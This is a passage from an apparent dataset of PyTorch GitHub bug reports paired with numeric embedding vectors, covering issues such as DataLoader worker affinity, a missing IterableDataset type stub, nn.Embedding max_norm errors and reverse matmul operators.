  9.20961145e-03 -1.11950815e-01 -2.26596028e-01 -1.79915071e-01
 -1.19972453e-01  1.50438011e-01  1.04367495e-01 -1.38984203e-01
  2.28556186e-01  2.06295148e-01 -2.47234017e-01 -3.03973556e-01
 -2.38161802e-01 -1.22651726e-01 -2.50315130e-01 -2.05416903e-02
  1.25582203e-01 -1.81365326e-01  2.40196466e-01  1.28546640e-01
  1.60740763e-01 -4.86808605e-02  2.28139699e-01 -4.22605760e-02
  3.56212199e-01 -1.61932245e-01  1.43406205e-02 -9.33858007e-02
  2.39626989e-01  4.35865045e-01 -3.18328589e-01  1.41996145e-01
 -1.24181129e-01 -1.54535025e-01 -5.22148609e-02 -6.39933884e-01
  3.94587100e-01  2.08713859e-03  1.24499813e-01  3.66371989e-01
  1.52241990e-01 -2.30421871e-02 -4.12081301e-01  1.72137961e-01
 -2.16826916e-01  1.55054107e-01  1.63242668e-01 -1.29352421e-01
 -2.35122412e-01 -2.83492841e-02 -4.23240483e-01 -1.05844475e-01
 -1.76386863e-01 -1.98032595e-02 -9.61306766e-02  1.22124657e-01
 -3.89090657e-01  6.91907704e-02  4.80658203e-01  1.70491740e-01
  1.31493270e-01 -1.49906009e-01 -2.07453743e-01 -5.78808114e-02
  1.21898979e-01  4.23284173e-01  1.00165278e-01 -1.36720449e-01
  1.81978509e-01 -3.45436960e-01 -1.03874624e-01  1.70476466e-01
 -1.84661835e-01  1.24986596e-01 -6.41243532e-04 -3.67154837e-01
  4.17213321e-01  1.92543358e-01  9.89985615e-02  5.62562086e-02
  4.04057324e-01  1.36080652e-01  5.11355959e-02 -4.16173488e-01
  3.40849936e-01  4.16684449e-01 -1.98519692e-01  3.96516025e-01
  6.40319407e-01 -3.46662581e-01 -2.80174483e-02 -1.30448535e-01
 -9.83310938e-02 -2.63960004e-01 -1.72920451e-01  1.06405258e-01
  6.30034983e-01 -7.20074624e-02 -3.27683747e-01 -8.11779350e-02
  3.30438673e-01 -1.15653947e-01 -7.49232918e-02  1.33833379e-01
 -1.01282805e-01  2.50857711e-01  3.57329547e-01  4.84911948e-02
  8.18314552e-02 -1.29554883e-01  9.93049741e-02 -2.46723831e-01
  2.58363068e-01 -2.24152699e-01  4.34812099e-01  2.04239666e-01
 -1.60330474e-01  1.07714355e-01 -1.84173882e-01  1.48406506e-01
  7.60931298e-02  1.39818922e-01  2.46147633e-01  5.30269109e-02
  1.59979492e-01 -2.93885440e-01 -2.06941843e-01 -1.83079511e-01
 -3.25601399e-01  1.98157787e-01 -1.11951426e-01  9.74140093e-02
 -2.93913223e-02  1.47547618e-01  2.39976913e-01  1.14742041e-01
  2.97296941e-01  1.28322408e-01 -1.03389442e-01 -1.11019269e-01
  1.09354034e-01  4.56511319e-01 -7.21072853e-02 -3.43679428e-01
 -3.33061427e-01 -3.67377326e-02  1.01441450e-01 -2.81886533e-02
 -1.96861058e-01 -2.53955513e-01  1.93902731e-01 -5.04640900e-02
 -1.43234968e-01 -2.89545022e-02 -2.58292168e-01 -1.02635048e-01
 -2.95197591e-04  3.84012640e-01  2.98668966e-02  4.94821638e-01
 -2.63190210e-01  2.12344170e-01  1.84932292e-01 -1.52602848e-02
 -2.67400295e-02  2.70720720e-01 -2.50295162e-01 -2.96070576e-01
 -3.52999382e-02  1.53177291e-01  1.82827592e-01 -1.85902581e-01
  5.55208549e-02  1.19780488e-01  3.99160944e-02 -8.56542867e-03
 -7.92780891e-02  1.38257235e-01  3.97409141e-01 -8.10208395e-02
 -4.32243533e-02  2.27422133e-01  1.62857339e-01 -8.58137161e-02
 -1.85328294e-02  4.11530912e-01  2.52776891e-01 -1.63484991e-01]"
The affinity of a worker process is reset after torch.randperm is called high priority module: dataloader triaged module: random,"## ðŸ› Bug

The affinity of a worker process is reset after `torch.randperm` is called in the worker process.

## To Reproduce

Steps to reproduce the behavior:

1. Change the worker process affinity in the `worker_init_fn` function.
1. Call `torch.randperm` in the `__iter__` method of an IterableDataser.
1. Now the worker process affinity is back to the original one.

The following code sample reproduce the problem :

```
import os
import torch
import torch.utils.data

class TestDataset(torch.utils.data.IterableDataset):
    
    def __iter__(self):
        assert(len(os.sched_getaffinity(0)) == 1)
        torch.randperm(1)
        assert(len(os.sched_getaffinity(0)) == 1)
        return range(1)

def worker_init_fn(_):
    os.sched_setaffinity(0, list(os.sched_getaffinity(0))[0:1])
        
if __name__ == '__main__':
    assert(len(os.sched_getaffinity(0)) > 1)
    dataset = TestDataset()
    dataloader = torch.utils.data.DataLoader(dataset, num_workers=1, worker_init_fn=worker_init_fn)
    for _ in dataloader:
        pass
```

## Expected behavior

I except that a call to `torch.randperm` inside a worker process doesn't touch the process affinity.

## Environment

I use the Docker image `pytorch/pytorch:1.3-cuda10.1-cudnn7-runtime`.

```
Collecting environment information...
PyTorch version: 1.3.0
Is debug build: No
CUDA used to build PyTorch: 10.1.243

OS: Ubuntu 16.04.6 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
CMake version: Could not collect

Python version: 3.6
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] numpy==1.17.2
[pip] torch==1.3.0
[pip] torchvision==0.4.1a0+d94043a
[conda] blas                      1.0                         mkl  
[conda] mkl                       2019.4                      243  
[conda] mkl-service               2.3.0            py36he904b0f_0  
[conda] mkl_fft                   1.0.14           py36ha843d7b_0  
[conda] mkl_random                1.1.0            py36hd6b4f25_0  
[conda] pytorch                   1.3.0           py3.6_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] torchvision               0.4.1                py36_cu101    pytorch
```


cc @ezyang @gchanan @zou3519 @jerryzh168 @SsnL",True,"[-0.5228752   0.07285111 -0.20608252 -0.18492575  0.04520016 -0.43372267
  0.21357343 -0.0246501  -0.34002677  0.0350884   0.15961479  0.1119229
 -0.07247609  0.13319331  0.1549493  -0.04067133 -0.23216154 -0.24137467
  0.0041424   0.00280184  0.24980044 -0.08904692 -0.05146042 -0.0093591
 -0.15103436 -0.03557471 -0.07308957 -0.3533372   0.19169411 -0.13182102
 -0.05045263  0.07165296 -0.22357622  0.09380457  0.35718587  0.32227248
 -0.2556559  -0.28861144 -0.14917958 -0.08277325  0.2630346  -0.12977445
 -0.01360609 -0.28496566 -0.2635533   0.0804551  -0.14801857  0.07503337
 -0.23351744 -0.30428132 -0.06121434  0.1194837  -0.18203047 -0.28080276
  0.02424504  0.01307405  0.17664376 -0.12196541 -0.07333577 -0.13599071
  0.21103838  0.1785298  -0.2981077   0.02731582  0.1919401  -0.07848641
 -0.03874394 -0.22498183  0.4147361  -0.16979831  0.3526842  -0.06623672
 -0.5471811  -0.05562767 -0.02433672  0.1554243  -0.09348845 -0.08653615
 -0.08791272 -0.10793629 -0.3155498  -0.04717911  0.10380703  0.17427465
 -0.15535486  0.16311428  0.34750012 -0.19431692  0.5017791   0.34916168
  0.00683351 -0.08201473 -0.13250607 -0.07103997 -0.1341094   0.07602344
  0.12988931  0.22549696 -0.05834074 -0.16244492 -0.15594342 -0.43252066
 -0.16398543  0.0348319  -0.02117708  0.05417057 -0.21362746  0.11768525
  0.13499284  0.04906387  0.21211231  0.1534906   0.04786121 -0.04401851
  0.0334458   0.05950835 -0.03056435 -0.0390581  -0.05139306  0.40459877
  0.2020759   0.1310199   0.00495294  0.16417025  0.13658686  0.23516329
  0.22510687  0.04387921  0.01854567  0.00398066  0.21280123 -0.05661688
 -0.18378027 -0.07240636  0.44221136  0.29393736 -0.21795663 -0.19721884
 -0.19812036  0.1375229   0.181736    0.07258752 -0.22774088 -0.38418365
  0.3112961   0.10268825 -0.20055711 -0.19397712 -0.02235606  0.28142485
 -0.05198703 -0.00792022 -0.14088136 -0.02638865  0.0829028   0.2253437
  0.24181029  0.14657149  0.16563463 -0.06540281 -0.03605806  0.52763253
  0.22193216  0.0839342   0.4915212  -0.1999474  -0.17873377 -0.07157843
 -0.19985518  0.38012832 -0.31422448 -0.29248288 -0.2477994  -0.3812621
  0.41872728  0.1319381   0.16024199 -0.31391442  0.04846639  0.22473155
  0.5632138   0.13089968  0.10462303  0.01986718  0.1416025   0.05441725
  0.16763765 -0.21551846 -0.179838   -0.05996126 -0.21869409  0.06240584
  0.63296473  0.19248882 -0.02137031 -0.14691499  0.02737829 -0.15246832
 -0.08245721 -0.04830895  0.10554951 -0.03417858 -0.30915248  0.17770076
 -0.03289726  0.24514645 -0.39084056 -0.24446279 -0.05202433  0.31980753
 -0.00790727 -0.38988322 -0.17071864 -0.14600565 -0.13328691 -0.13064492
 -0.1420142   0.10416568  0.07077502 -0.0392306   0.12400059  0.2674966
 -0.08244351 -0.04700784 -0.21737725 -0.10918761  0.03371965 -0.09651153
  0.06403077 -0.19129246 -0.15901917 -0.21030146  0.18507636  0.33231845
  0.10335536 -0.12687899  0.00946023 -0.0706616  -0.00720667 -0.21943548
 -0.06136183 -0.09851462 -0.02099582  0.06323748  0.01049049  0.14370614
 -0.13440135 -0.13827083 -0.11572008 -0.30734244 -0.25189734 -0.02340675
  0.2021392  -0.16587612  0.17344284  0.08746443 -0.11455424  0.0547522
  0.01005497 -0.1685473  -0.14250477  0.5801051   0.45139378  0.17284225
  0.07447208 -0.2010541  -0.10812601  0.15010709  0.20056677 -0.33646637
  0.04731183 -0.44082963 -0.02103127  0.03064493  0.29961112 -0.0886576
  0.25094947 -0.24804541 -0.02377911  0.0248649   0.41029012  0.09606268
 -0.4303601   0.17998777  0.29755425 -0.32079214  0.27563924  0.2573526
 -0.1913031   0.03617613 -0.22136593 -0.12931973  0.00977152 -0.32990134
  0.1215414   0.23139787  0.29756963 -0.10090432  0.01932763 -0.20407957
 -0.0398128  -0.16511822  0.19679761 -0.02844517 -0.39517036 -0.18562478
  0.31494915 -0.00119385  0.25590467 -0.04561596  0.2788573   0.20193326
 -0.07410639  0.05596001 -0.2858777  -0.06812811 -0.01869539  0.15065148
 -0.08157347  0.18843517  0.09546173 -0.24380936  0.13435832  0.23215954
  0.1390111   0.15182531 -0.09480076  0.07945344  0.0130011   0.1740591
  0.13168183 -0.02884477  0.25115833  0.2956738   0.18897    -0.26438078
 -0.03993657  0.09774496 -0.32659617 -0.26323804 -0.11353616 -0.22298777
  0.01662678 -0.34957236 -0.23639506  0.00134712  0.05686758  0.32814553
 -0.09757983  0.20748617 -0.09479012  0.09078879 -0.13443989  0.24425696
  0.08403917  0.38485372  0.18076439  0.16160482 -0.03990791  0.06668803
  0.01713087  0.38196367 -0.31050226  0.19612066  0.03344248 -0.11340053
 -0.06301036 -0.01249476 -0.15392683  0.325718   -0.2612774   0.16494974
 -0.12158283  0.32697317  0.223917   -0.1377902   0.11855251 -0.47930688
 -0.0269042   0.21344194  0.04177936 -0.18964964 -0.08142629  0.03175444]"
IterableDataset should be added into dataset.pyi module: dataloader module: typing triaged,"## ðŸ› Bug
trying to import `IterableDataset` in `torch.utils.data.dataset` creates an error in PyCharm. look at the following picture:
![å›¾ç‰‡](https://user-images.githubusercontent.com/44257865/66712058-9c6b5500-edc9-11e9-9492-64c416939e7b.png)

It says that `cannot find reference in dataset.pyi`, where in `dataset.pyi`, we can see that:
![å›¾ç‰‡](https://user-images.githubusercontent.com/44257865/66712088-f9670b00-edc9-11e9-9ad4-417bc791c207.png)

It's obviously that there is no `IterableDataset` but only its super class `Dataset` exists.
I believe it should be added.


## To Reproduce
Steps to reproduce the behavior:

1. Open PyCharm
2. Write `from torch.utils.data.dataset import IterableDataset`
3. Error

## Expected behavior

No unresolved reference hinted.

## Environment
```
PyTorch version: 1.2.0
Is debug build: No
CUDA used to build PyTorch: Could not collect

OS: Arch Linux
GCC version: (GCC) 9.2.0
CMake version: version 3.15.4

Python version: 3.7
Is CUDA available: No
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: GeForce RTX 2060
Nvidia driver version: 435.21
cuDNN version: /usr/lib/libcudnn.so.7.6.4

Versions of relevant libraries:
[pip3] numpy==1.17.2
[pip3] torch==1.2.0
[pip3] torchvision==0.4.0a0
[conda] Could not collect
```

## Additional context


cc @SsnL @ezyang",True,"[-0.04210457 -0.12132733 -0.37472838 -0.1223973   0.14424026 -0.13976869
 -0.05306273  0.01125986 -0.50379896  0.06595132  0.13301143 -0.19442825
 -0.1542499   0.09094457 -0.09036276  0.00499923 -0.18095213 -0.15148853
 -0.15771276 -0.21391262  0.16243353 -0.0335083  -0.09564412 -0.30349636
  0.20572993 -0.01910095 -0.35141435 -0.12038588 -0.03712845  0.36100253
  0.07165889  0.01619329 -0.20638615  0.25479203  0.32163724 -0.10584748
 -0.49434543  0.03264954 -0.07670796 -0.03149667  0.06684153  0.22708818
 -0.0555666  -0.10080741 -0.11235452 -0.03316106 -0.30768833  0.23703346
 -0.1579946   0.20479752  0.050036   -0.02997228 -0.3663211   0.00926606
 -0.00340788 -0.18752237 -0.0827619   0.21709998 -0.0472643  -0.0385301
  0.16426    -0.04514846  0.01089356 -0.1556323  -0.12117265  0.04111861
 -0.05233902 -0.18253401  0.75429285 -0.24235511 -0.07025194  0.172043
  0.03489569 -0.03554443 -0.05592337 -0.04723957 -0.49954692  0.30749294
 -0.3245511  -0.08331716  0.06079693  0.13388346  0.06219255  0.145322
  0.02718964 -0.1292916  -0.0615909  -0.06830538  0.19057953  0.3446232
  0.34259474  0.19357651  0.23412949  0.21426092 -0.00453939  0.20371705
  0.12732151  0.1330818  -0.0515752  -0.20362842 -0.2440062  -0.7134614
 -0.34476474  0.43182242 -0.01778255 -0.15017477  0.14062674  0.10670744
  0.11320525 -0.09203496  0.10810832  0.267471   -0.14483131 -0.30590853
 -0.08106641 -0.43238407 -0.24939081  0.07253511 -0.49968526  0.31490132
  0.02842848 -0.09843155  0.04681066  0.16127774  0.47585195 -0.02690206
 -0.03120642  0.04287942  0.04027634 -0.06052702  0.33083427 -0.06745338
  0.00874671 -0.2002904   0.27226377 -0.03026811 -0.40997154 -0.05836127
 -0.30137542 -0.29015288 -0.30530128  0.1623177   0.12839708 -0.22947282
  0.09942365  0.18469137 -0.22217627  0.15368336 -0.03824019  0.053982
 -0.06194928 -0.10503079 -0.37874544  0.68093026  0.11656669  0.17210595
  0.2494275   0.12408121  0.14383367 -0.32603988 -0.07177395 -0.00477224
  0.12329638 -0.42932883  0.25741458  0.04816258 -0.12820074 -0.28409082
  0.10920186  0.00201527 -0.11062959  0.01910069 -0.05369579 -0.1706092
  0.09221826  0.14421895  0.12426559 -0.40751064  0.13443854  0.2824515
  0.5560648   0.34385842 -0.01900877  0.00491378  0.06233445  0.06992117
  0.4189084  -0.00363478 -0.07596865 -0.1920084  -0.11691809  0.00437251
  0.4426107  -0.11105418 -0.02719532 -0.05277881  0.114146    0.2853984
  0.10496069  0.03751905 -0.07479969  0.34168652  0.12523118 -0.2013377
  0.17645499 -0.15522312 -0.24501504 -0.3699476  -0.4689417   0.28686047
 -0.3007247  -0.17886725 -0.18507445  0.0117352   0.02510236  0.0415615
  0.10047001  0.07427947 -0.18373562  0.22395423  0.06696682 -0.21060771
 -0.20709527 -0.29515442  0.12636651  0.43929124 -0.2615534  -0.27938974
  0.14166887 -0.13043109 -0.1616551  -0.13634095  0.2984895   0.18052623
  0.23841092  0.31466705 -0.03500162 -0.17772025 -0.2039348   0.51838577
 -0.37684035 -0.28872126 -0.06636409 -0.3531047  -0.10376624 -0.30221662
 -0.01138733 -0.16172361 -0.2203193   0.06622446 -0.14290103 -0.3432904
  0.16723967  0.10259832  0.3032182  -0.09206567  0.07500963 -0.08791547
 -0.09019843 -0.11617872  0.3076048  -0.02487835 -0.01011026  0.39613408
  0.19315606 -0.03577353 -0.30124998  0.4591726  -0.05030055 -0.22193716
  0.30625704 -0.03493547  0.45933807  0.01464536  0.38836592 -0.06746046
  0.21271631  0.05798673 -0.0328082   0.04778932  0.1734153  -0.01313388
 -0.10184213  0.01188416  0.31523883 -0.15705243 -0.29211575 -0.12510872
 -0.3207661  -0.09859691  0.14063865 -0.05796473  0.2723645  -0.06257658
 -0.18974464 -0.11405059  0.15913409 -0.0448567   0.02784227  0.32651296
 -0.12791213  0.22625019  0.21511456 -0.01010113 -0.1650724  -0.08076061
  0.16919854 -0.07646407  0.82953686 -0.2905358   0.32353956  0.21355672
 -0.29875743  0.5246205  -0.08359977 -0.11830641  0.03804349  0.22292246
  0.13052979  0.12112629 -0.19893679 -0.32931298 -0.29492873  0.02368926
  0.2837677   0.04274737 -0.46406204  0.35803264  0.09526132  0.08726616
  0.2094702  -0.07768333 -0.09583361  0.5120839   0.08716366 -0.31358856
 -0.01770153  0.28340587  0.01181315 -0.347844   -0.07529151 -0.2689867
  0.01194705 -0.5689517  -0.1497947  -0.04609867  0.02419649  0.54375887
 -0.2657257   0.2574581   0.2074553   0.06665838  0.03286182  0.124038
  0.11174814  0.43656054 -0.23470901  0.21108791 -0.1720714   0.0041527
 -0.22037892  0.4484774  -0.29094636  0.04636344  0.11521371 -0.2338691
 -0.18579036 -0.10580459  0.01053681  0.4738431  -0.37936202  0.06946513
 -0.1232284   0.27864563  0.41632468 -0.19709806  0.32015553 -0.13147995
  0.210479    0.20170003  0.08825751  0.18555278 -0.07630231 -0.11258319]"
nn.Embedding with max_norm shows unstable behavior and causes sometimes runtime error. high priority module: nn triaged,"## ðŸ› Bug

An `nn.Embedding` object with `max_norm` set to `True` causes a RuntimeError that is hard to track.

## To Reproduce
The following code causes a RuntimeError. The error can be avoided by **removing the max_norm** feature or by **swapping Line a and Line b** in the code.
```
import torch
import torch.nn as nn

n, d, m = 3, 5, 7
batch_size = 11

embedding = nn.Embedding(n, d, max_norm=True)
W = torch.randn((m, d), requires_grad=True)
optimizer = torch.optim.Adam(list(embedding.parameters()) + [W], lr=1e-3)

optimizer.zero_grad()
idx = torch.tensor([1, 2])

a = embedding.weight @ W.t()  # Line a 
b = embedding(idx) @ W.t()    # Line b

out = (a.unsqueeze(0) + b.unsqueeze(1))
loss = out.sigmoid().prod()
loss.backward()
optimizer.step()
```

```
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-472-103ef18503d8> in <module>
     17 out = (a.unsqueeze(0) + b.unsqueeze(1))
     18 loss = out.sigmoid().prod()
---> 19 loss.backward()
     20 optimizer.step()

~/miniconda3/envs/kg/lib/python3.7/site-packages/torch/tensor.py in backward(self, gradient, retain_graph, create_graph)
    116                 products. Defaults to ``False``.
    117         """"""
--> 118         torch.autograd.backward(self, gradient, retain_graph, create_graph)
    119 
    120     def register_hook(self, hook):

~/miniconda3/envs/kg/lib/python3.7/site-packages/torch/autograd/__init__.py in backward(tensors, grad_tensors, retain_graph, create_graph, grad_variables)
     91     Variable._execution_engine.run_backward(
     92         tensors, grad_tensors, retain_graph, create_graph,
---> 93         allow_unreachable=True)  # allow_unreachable flag
     94 
     95 

RuntimeError: one of the variables needed for gradient computation has been modified by an inplace operation: [torch.FloatTensor [3, 5]] is at version 2; expected version 1 instead. Hint: enable anomaly detection to find the operation that failed to compute its gradient, with torch.autograd.set_detect_anomaly(True).
```

## Expected behavior
There shouldn't be any error when running the code above.
Strangely, there is no RuntimeError when **Line a** and **Line b** are swapped. This is something that has to be investigated.

## Environment

PyTorch version: 1.2.0
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.3 LTS
GCC version: (Homebrew gcc 5.5.0_4) 5.5.0
CMake version: Could not collect

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: GeForce GTX 1080 Ti
Nvidia driver version: 430.26
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.3

Versions of relevant libraries:
[pip] botorch==0.1.3
[pip] gpytorch==0.3.5
[pip] numpy==1.17.2
[pip] torch==1.2.0
[pip] torchvision==0.4.0a0+6b959ee
[conda] blas                      1.0                         mkl
[conda] botorch                   0.1.3                    pypi_0    pypi
[conda] gpytorch                  0.3.5                    pypi_0    pypi
[conda] libblas                   3.8.0                    12_mkl    conda-forge
[conda] libcblas                  3.8.0                    12_mkl    conda-forge
[conda] liblapack                 3.8.0                    12_mkl    conda-forge
[conda] mkl                       2019.4                      243
[conda] pytorch                   1.2.0           py3.7_cuda10.0.130_cudnn7.6.2_0    pytorch
[conda] torchvision               0.4.0                py37_cu100    pytorch

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @jlin27 @albanD @mruberry",True,"[-0.129724    0.02684003 -0.37408602 -0.16668272  0.07030685 -0.13298646
 -0.05533027  0.17304108 -0.48419887  0.04772256 -0.10514919  0.11112562
  0.06421286  0.16197649 -0.21319589  0.32089373 -0.0756257  -0.0703786
 -0.24142495 -0.07541916  0.1692492  -0.09060991  0.13501358 -0.11173989
 -0.1411379  -0.08797678 -0.21478319 -0.04775021  0.39485034  0.05905408
 -0.10696961 -0.09944635 -0.22913224  0.12611753  0.09148103  0.09461761
 -0.23778069 -0.1824113  -0.23573881  0.09115883  0.21366304  0.30731142
 -0.11133     0.13422284 -0.28244305  0.12379618 -0.0165258  -0.0904666
 -0.22935942 -0.08099924 -0.12451846  0.33518237 -0.20522577 -0.10973647
  0.23222922 -0.44275656 -0.20604095  0.02417689  0.16666034 -0.3947019
  0.0549963  -0.03626791 -0.01369106 -0.2863422   0.37381423 -0.22944644
 -0.10900534  0.20401704  0.09670553  0.31575847  0.18800072  0.15774179
 -0.14009255  0.21409515  0.26580215  0.3132936  -0.4311455   0.02012757
 -0.1876813  -0.35060883  0.08361486  0.03722475 -0.20726234 -0.13587669
  0.10716245 -0.0182892   0.29060054 -0.29718417  0.43081576  0.26996273
  0.28018832 -0.36146128 -0.2704121   0.44812638  0.32318732 -0.12109795
  0.19108531  0.1502153  -0.49944887 -0.24224938 -0.32417828 -0.56864315
 -0.294934    0.35504597  0.1860374   0.00328186 -0.05608194  0.26022428
  0.03044154 -0.04584296  0.3175714   0.12317109 -0.02845407 -0.07465959
 -0.08402652  0.02608898 -0.04464765 -0.19807345 -0.4083607   0.24289095
  0.21355253  0.07682735 -0.16347459  0.25102872  0.3024469   0.41227412
  0.14590311 -0.11554374 -0.11764552 -0.07573919  0.03754473 -0.0956963
  0.15771553  0.08825611  0.25068688  0.20986395 -0.25978315  0.0560357
 -0.30697578  0.1215435  -0.20671901  0.0593034  -0.05020558 -0.28113484
  0.10464022 -0.19622575 -0.4309294   0.18233636  0.1441572  -0.3333051
 -0.03861272 -0.26316544 -0.5590273  -0.13108741  0.02732391  0.03630782
  0.16287766 -0.00325604  0.1331513  -0.23154321  0.19204743  0.09436449
  0.3140151   0.05074994  0.3567952   0.22993037 -0.08573683 -0.15003105
 -0.5432946   0.12383095  0.0156228   0.0543241  -0.00421138 -0.17709273
  0.2719716  -0.2049805  -0.5203804  -0.11282694 -0.17839977  0.33441097
  0.44302914  0.1180771   0.112229   -0.02914538 -0.01343302 -0.08240686
  0.18407534  0.1139026  -0.05615815 -0.05986802 -0.06411649 -0.29499942
  0.36580294 -0.02903796  0.07673223 -0.14787865  0.06436604  0.03229352
  0.3067742  -0.09510362 -0.15877233 -0.04148196  0.1803787   0.11177474
  0.3056128   0.12002432 -0.21735251 -0.50654507 -0.28701636  0.40764576
 -0.47669357 -0.27098382 -0.13268246 -0.23863015 -0.10593387 -0.04303899
  0.06880775 -0.18085271  0.06904797  0.01333116  0.185187   -0.01571339
 -0.11976817 -0.08018819  0.20177281  0.20576026  0.06481293  0.2782122
 -0.00969565  0.13068339  0.00401961 -0.22264381  0.14720798 -0.02707898
  0.26098326  0.27563232  0.01318009  0.23618925  0.25397742 -0.02457312
 -0.362458    0.08175832  0.11381827 -0.13726231 -0.06323098  0.0034892
 -0.35828033  0.0043651  -0.2671128   0.01225155 -0.4248736   0.31784868
 -0.15531093 -0.19403854  0.18657678  0.1495344   0.05283675 -0.07747682
  0.00862906 -0.05760355  0.31396234  0.3736657   0.04666232  0.31896573
  0.05350858 -0.03927801 -0.31271872  0.15781888 -0.11244019  0.13028103
 -0.06270864 -0.31058362  0.36850208  0.13250811  0.3351769   0.01078938
  0.26139146 -0.08489635 -0.00293863 -0.04683503 -0.16927384  0.35955346
  0.06407761  0.57188344  0.37407225 -0.09442839 -0.17296441 -0.04574948
  0.01595919 -0.18599296  0.13105854 -0.2538074   0.4415224  -0.04628287
 -0.3379864   0.4664871  -0.09025532 -0.08257222 -0.12899396 -0.19426878
  0.16510925  0.4316167   0.19860414  0.16872689 -0.31744212 -0.00325067
  0.07999291  0.15425771  0.14163679 -0.1897511   0.38162076 -0.01623526
 -0.450139    0.16682924 -0.13455892  0.19702944 -0.07611297  0.15482005
  0.05093909  0.12763321 -0.373443   -0.32694572 -0.23730999  0.12273823
  0.10909385  0.00123817 -0.21948233 -0.00341324 -0.14999402  0.35469627
  0.4555294  -0.1175559  -0.06474517 -0.10117669 -0.1394018  -0.28383017
 -0.32828778  0.48472512  0.00728039 -0.09203728  0.01401547 -0.01605957
  0.04608884 -0.18713625 -0.06367721 -0.36963415 -0.00938707  0.4177516
 -0.04354459 -0.09552879  0.1202625   0.01291808 -0.08116689  0.1389828
 -0.19818217  0.4258957  -0.01961974  0.18894216 -0.35305494  0.23691192
  0.1464355   0.17260781 -0.33812347 -0.2233398  -0.14026517 -0.13952968
  0.14398679 -0.04798166  0.19774073  0.00275531  0.21154243  0.2644894
  0.11709622  0.07183593  0.04728308 -0.19498868 -0.06568362 -0.0749829
 -0.0430402  -0.02190671 -0.06786396  0.13560063 -0.21747632  0.03383965]"
torch.Tensor reverse operators (__rmul__) should return NotImplemented for unsupported types high priority feature triaged enhancement,"Currently if the the argument of `__rmatmul__` is not a Tensor, PyTorch throws `*** TypeError: matmul(): argument 'other' (position 1) must be Tensor, not Vec`

Python data model asks that it return `NotImplemented` in such case. This allows interpreter to dispatch op to the proper implementation.
(ie see https://docs.python.org/3/library/numbers.html#implementing-the-arithmetic-operations)

Current behavior makes it hard to implement custom types. IE
```
class FactoredMatrix:
  def __init__(self, mat):
    self.mat = mat
  def __matmul__(self, other):
    return 0
  def __rmatmul__(self, other):
    return 1
x = torch.ones((2,2))
print(FactoredMatrix(x) @ x)  # works
print(x @ FactoredMatrix(x))  # fails
```


cc @ezyang @gchanan @zou3519",True,"[-2.57821769e-01 -1.07618824e-01 -3.69400531e-01  1.71445124e-02
 -2.22712308e-01 -1.21992961e-01  1.62497818e-01  1.01316543e-02
 -4.64339077e-01 -2.55995914e-02  1.19807743e-01 -1.72577202e-01
 -8.30786377e-02  3.66137534e-01  4.25880291e-02  1.10596642e-01
 -1.51414543e-01 -2.08199993e-02 -3.50208357e-02 -8.87949206e-03
  5.51377125e-02 -6.16921186e-02 -1.99274883e-01  1.69922397e-01
 -6.79342747e-02  1.14403635e-01 -1.25185460e-01 -1.45836890e-01
  2.87504971e-01  3.90478909e-01  4.23210189e-02  1.09850302e-01
 -4.05340284e-01 -1.52303815e-01  4.46916223e-02  2.78669834e-01
 -2.08149761e-01 -2.21847713e-01  1.58772785e-02 -3.86693552e-02
  1.48066580e-01  1.58761442e-01  1.12967314e-02 -6.82212412e-02
 -7.22689778e-02  5.19743562e-02  2.40239516e-01  1.26968026e-01
 -2.84592330e-01 -6.61934018e-02 -8.50133449e-02  1.88066348e-01
 -2.35997647e-01 -3.43255460e-01 -4.59418334e-02 -4.07449156e-02
  2.07804769e-01  6.12306893e-02  1.04992531e-01 -3.49917829e-01
 -3.43922153e-02 -4.80953306e-02  1.25634074e-01 -4.48443480e-02
  1.31152458e-02 -9.34721678e-02  1.99118759e-02 -1.56153560e-01
  4.52002198e-01  1.20353423e-01  2.27085471e-01 -5.47567867e-02
 -1.44257069e-01  3.05789132e-02  2.89982148e-02  2.28017539e-01
 -8.00626725e-02  3.62010181e-01  2.78838910e-02 -2.97583699e-01
  2.09711157e-02 -2.67364625e-02  2.88584493e-02 -1.13707118e-01
  1.32810459e-01 -2.77781673e-02  2.65598595e-01  9.46867764e-02
  4.61042136e-01  9.81595516e-02  3.09356987e-01 -1.39466763e-01
  4.53557000e-02  9.60431546e-02  2.26083890e-01  1.32860407e-01
  1.33736148e-01  1.01087019e-01 -3.92434001e-01 -1.94018960e-01
 -2.29970068e-01 -3.39856267e-01 -4.01832342e-01  1.31965175e-01
  3.45591396e-01  1.60612270e-01  8.62648040e-02 -8.55822414e-02
  1.10747017e-01 -1.36535361e-01  2.07692891e-01  1.61212027e-01
  1.95629001e-01  2.75747664e-02 -5.06119765e-02  6.31515458e-02
 -5.73184118e-02  6.32114559e-02  3.07456590e-03  2.09264398e-01
 -2.70097181e-02 -9.44085643e-02  7.76316971e-02  3.81952465e-01
  3.36338818e-01  9.07629058e-02 -7.87279606e-02 -8.12199861e-02
  9.38255042e-02 -2.34851405e-01  3.34168315e-01 -3.19867402e-01
 -1.49298608e-01  2.15214882e-02  2.40133882e-01 -4.16575931e-03
 -1.59364045e-01 -2.50923336e-01 -3.59695703e-01  6.08473830e-03
  1.58207938e-02  1.35927722e-02 -5.08124009e-02 -6.78860247e-02
  3.27668846e-01  1.88845590e-01 -1.99366674e-01 -2.03571133e-02
  3.83446403e-02  4.07841474e-01 -1.34918392e-01  3.67011875e-03
 -2.46601909e-01  1.86012298e-01  1.07854381e-01 -1.14902603e-02
  1.87708676e-01 -1.07247271e-01 -1.82898361e-02 -4.12419558e-01
  1.57333732e-01  3.22451591e-01 -1.45856589e-01  2.60766715e-01
  2.54813880e-02  2.99914241e-01 -1.30573556e-01 -3.71675454e-02
 -4.55256641e-01  1.34056479e-01 -2.61730969e-01  1.29663467e-01
 -1.48954213e-01 -2.99114645e-01  1.17983378e-01 -1.06941879e-01
 -3.48123670e-01 -8.22801232e-01 -4.83254790e-02  2.78181911e-01
